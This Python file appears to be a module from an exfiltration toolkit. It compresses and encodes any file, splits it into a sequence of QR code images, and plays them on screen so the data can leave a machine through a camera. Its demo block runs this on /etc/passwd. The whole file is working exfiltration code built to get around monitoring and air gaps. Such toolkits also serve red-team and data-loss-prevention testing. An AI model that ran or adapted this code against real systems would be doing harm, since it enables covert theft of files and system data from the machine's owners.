#!/usr/bin/env python3

try:
    import os
    import sys
    import zlib
    import time
    import qrcode
    import base64
    import hashlib

    from PIL import Image
except ImportError as e:
    import sys
    sys.stdout.write(
        "Error importing something. Try 'pip install --user -r requirements'.\n%s\n" % e
    )
    sys.exit(1)

from pyexfil.includes.base import PhysicalModule


# Globals
DEFAULT_FOLDER  = "pyexfil/physical/qr/outputs/"
MAXIMUM_QR_SIZE = 800 - 3     # in bytes (-2 for index, -1 for delimiter)
DELIMITER       = ";"
DELAY           = 3


def split2len(s, n):
    def _f(s, n):
        while s:
            yield s[:n]
            s = s[n:]
    return list(_f(s, n))


def CreateQRs(filename, folder=DEFAULT_FOLDER):

    try:
        with open(filename, "rb") as f:
            data = f.read()
    except IOError as e:
        sys.stdout.write("Error opening file '%s'.\n%s.\n" % (filename, e))
        return False

    hexdigest = hashlib.md5(data).hexdigest()
    zdata     = zlib.compress(data)
    zdata     = base64.b64encode(zdata)
    slices    = split2len(zdata, MAXIMUM_QR_SIZE)

    first_slice_data = filename + DELIMITER + hexdigest + DELIMITER + str(len(slices))
    img = qrcode.make(first_slice_data)
    img.save(folder + "0.png")

    i = 1
    for sly in slices:
        if isinstance(sly, bytes):
            sly = sly.decode("utf-8")
        write_me = str(i).zfill(2) + sly
        img = qrcode.make(write_me)
        img.save(folder + str(i) + ".png")
        i += 1
    sys.stdout.write("Saved a total of %s images.\n" % i)
    return True


def PlayQRs(folder=DEFAULT_FOLDER, delay=DELAY):
    all_pngs = [each for each in os.listdir(folder) if each.endswith(".png")]
    if len(all_pngs) == 0:
        sys.stderr.write("No images found to display.\n")
        return False

    for png in all_pngs:
        i = Image.open(folder + png)
        i.show()
        time.sleep(delay)
        i.close()
    sys.stdout.write("Finished playing images.\n")
    return True


class QRExfil(PhysicalModule):

    MODULE_NAME = "QRExfil"
    PROTOCOL    = "qr-visual"

    def __init__(self, output_folder=DEFAULT_FOLDER, delay=DELAY, verbose=False):
        """
        :param output_folder: Directory where QR PNGs are saved [str]
        :param delay:         Seconds between displayed frames [int]
        """
        super().__init__(verbose=verbose)
        self.output_folder = output_folder
        self.delay         = delay

    def _send_impl(self, data, **kwargs):
        """
        :param data: File path to exfiltrate [str]
        """
        if not CreateQRs(filename=data, folder=self.output_folder):
            return False
        return PlayQRs(folder=self.output_folder, delay=self.delay)

    def _receive_impl(self, **kwargs):
        raise NotImplementedError(
            "Use QRDecoder for receive."
        )


if __name__ == "__main__":
    if CreateQRs("/etc/passwd"):
        sys.stdout.write("Will now start playing the QRs.\n")
        time.sleep(DELAY)
        PlayQRs()
    else:
        sys.stderr.write("Something went wrong with creating QRs.\n")
        sys.exit(1)
